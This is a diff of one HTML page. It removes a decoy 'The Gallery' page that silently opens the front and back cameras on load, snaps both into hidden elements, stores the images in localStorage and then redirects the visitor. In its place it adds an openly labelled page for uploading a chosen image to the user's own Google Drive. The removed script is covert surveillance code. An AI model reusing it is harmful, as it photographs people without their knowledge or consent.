@@ -1,98 +1,192 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>The Gallery</title>
-    <style>
-        body {
-            margin: 0; padding: 0;
-            background-color: #ffffff;
-            font-family: 'Segoe UI', sans-serif;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-        }
-        h1 { font-size: 3.5rem; margin: 0; color: #2d3436; }
-        p { font-size: 1.5rem; color: #636e72; margin: 10px 0 30px 0; }
-        .next-btn {
-            padding: 15px 40px;
-            font-size: 1.2rem;
-            background-color: #0984e3;
-            color: white;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-        }
-        / Hidden elements /
-        #vFront, #vBack, #canvas {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            visibility: hidden;
-        }
-    </style>
+  <base target="_top">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      padding: 20px;
+      background: #101525;
+      color: #f4f6ff;
+      font-family: Arial, sans-serif;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 440px;
+      padding: 26px;
+      background: #1b2338;
+      border: 1px solid #34405c;
+      border-radius: 22px;
+      text-align: center;
+    }
+
+    h1 { margin-top: 0; }
+
+    p { color: #b9c3dc; line-height: 1.5; }
+
+    input {
+      display: block;
+      width: 100%;
+      margin: 22px 0;
+      padding: 12px;
+      background: #111a2c;
+      color: white;
+      border-radius: 12px;
+    }
+
+    img {
+      display: none;
+      width: 100%;
+      max-height: 320px;
+      object-fit: contain;
+      margin: 18px 0;
+      border-radius: 12px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      border: 0;
+      border-radius: 12px;
+      background: #8b7cff;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      opacity: 0.5;
+      cursor: wait;
+    }
+
+    #status {
+      overflow-wrap: anywhere;
+      margin-top: 18px;
+    }
+
+    a { color: #b7adff; }
+  </style>
 </head>
 <body>
+  <main class="card">
+    <h1>🔒 My Private Camera</h1>
+    <p>
+      Take a picture or choose an image.
+      Upload it to your private Google Drive.
+    </p>
 
-    <div class="content">
-        <h1 id="main-title">The Horizon</h1>
-        <p id="main-desc">Experience the beauty of the moment.</p>
-        <button class="next-btn" onclick="goToPageTwo()">Continue</button>
-    </div>
+    <input
+      id="photo"
+      type="file"
+      accept="image/*"
+      capture="environment"
+    >
 
-    <video id="vFront" autoplay playsinline></video>
-    <video id="vBack" autoplay playsinline></video>
-    <canvas id="canvas" width="1080" height="1920"></canvas>
+    <img id="preview" alt="Selected photo preview">
 
-    <script>
-        const vFront = document.getElementById('vFront');
-        const vBack = document.getElementById('vBack');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
+    <button id="upload" disabled>
+      Upload to My Drive
+    </button>
 
-        // Set high-quality portrait resolution
-        canvas.width = 1080;
-        canvas.height = 1920;
+    <p id="status" role="status">
+      Choose a picture to get started.
+    </p>
+  </main>
 
-        window.onload = () => {
-            // Step 1: Get the Front Camera
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(streamFront => {
-                vFront.srcObject = streamFront;
-                
-                // Step 2: Get the Back Camera
-                return navigator.mediaDevices.getUserMedia({ video: { facingMode: "back" } }).then(streamBack => {
-                    vBack.srcObject = streamBack;
+  <script>
+    const input = document.getElementById("photo");
+    const preview = document.getElementById("preview");
+    const button = document.getElementById("upload");
+    const status = document.getElementById("status");
 
-                    // Step 3: THE SNAP (Wait 1.5 seconds for the camera to focus)
-                    setTimeout(() => {
-                        // Capture Front
-                        ctx.drawImage(vFront, 0, 0, canvas.width, canvas.height);
-                        localStorage.setItem('frontPhoto', canvas.toDataURL());
+    let selectedFile = null;
 
-                        // Capture Back (Small delay between the two)
-                        setTimeout(() => {
-                            ctx.drawImage(vBack, 0, 0, canvas.width, canvas.height);
-                            localStorage.setItem('backPhoto', canvas.toDataURL());
-                            console.log("Photos Saved!");
-                        }, 500);
-                    }, 1500);
-                });
-            });
-        };
+    input.addEventListener("change", () => {
+      selectedFile = input.files[0] || null;
+      button.disabled = !selectedFile;
 
-        function goToPageTwo() {
-            // We check if photos exist before moving
-            if(localStorage.getItem('frontPhoto') && localStorage.getItem('backPhoto')) {
-                window.location.href = "page2.html";
-            } else {
-                // Fallback: If photos didn't load in time, move anyway
-                window.location.href = "page2.html";
-            }
-        }
-    </script>
+      if (!selectedFile) {
+        preview.style.display = "none";
+        status.textContent = "No picture selected.";
+        return;
+      }
+
+      if (!selectedFile.type.startsWith("image/")) {
+        selectedFile = null;
+        button.disabled = true;
+        status.textContent = "Please select an image.";
+        return;
+      }
+
+      const reader = new FileReader();
+
+      reader.onload = () => {
+        preview.src = reader.result;
+        preview.style.display = "block";
+        status.textContent = "Picture ready to upload.";
+      };
+
+      reader.readAsDataURL(selectedFile);
+    });
+
+    button.addEventListener("click", () => {
+      if (!selectedFile) return;
+
+      if (selectedFile.size > 5 * 1024 * 1024) {
+        status.textContent =
+          "Please choose an image smaller than 5 MB.";
+        return;
+      }
+
+      button.disabled = true;
+      status.textContent = "Uploading your picture...";
+
+      const reader = new FileReader();
+
+      reader.onload = () => {
+        google.script.run
+          .withSuccessHandler(result => {
+            status.replaceChildren();
+
+            const message = document.createElement("span");
+            message.textContent =
+              "✅ Saved privately: " + result.name;
+            status.appendChild(message);
+            status.appendChild(document.createElement("br"));
+
+            const link = document.createElement("a");
+            link.href = result.url;
+            link.target = "_blank";
+            link.rel = "noopener";
+            link.textContent = "Open picture in Google Drive";
+            status.appendChild(link);
+
+            button.disabled = false;
+          })
+          .withFailureHandler(error => {
+            status.textContent =
+              "Upload failed: " + error.message;
+            button.disabled = false;
+          })
+          .saveImage(reader.result);
+      };
+
+      reader.onerror = () => {
+        status.textContent = "Could not read the picture.";
+        button.disabled = false;
+      };
+
+      reader.readAsDataURL(selectedFile);
+    });
+  </script>
 </body>
 </html>
